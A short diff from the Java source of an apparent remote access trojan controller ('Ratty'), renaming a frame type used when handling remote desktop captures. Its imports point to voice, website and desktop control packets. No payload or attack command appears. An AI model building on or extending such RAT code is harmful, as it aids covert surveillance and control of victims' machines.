@@ -47,7 +47,7 @@ import de.sogomn.rat.packet.VoicePacket;
 import de.sogomn.rat.packet.WebsitePacket;
 import de.sogomn.rat.server.AbstractRattyController;
 import de.sogomn.rat.server.ActiveServer;
-import de.sogomn.rat.util.FrameEncoder.IFrame;
+import de.sogomn.rat.util.FrameEncoder.Frame;
 import de.sogomn.rat.util.XorCipher;
 
 /*
@@ -530,7 +530,7 @@ public final class RattyGuiController extends AbstractRattyController implements
 			return;
 		}
 		
-		final IFrame[] frames = packet.getFrames();
+		final Frame[] frames = packet.getFrames();
 		final int screenWidth = packet.getScreenWidth();
 		final int screenHeight = packet.getScreenHeight();
 		final DesktopPacket request = new DesktopPacket();
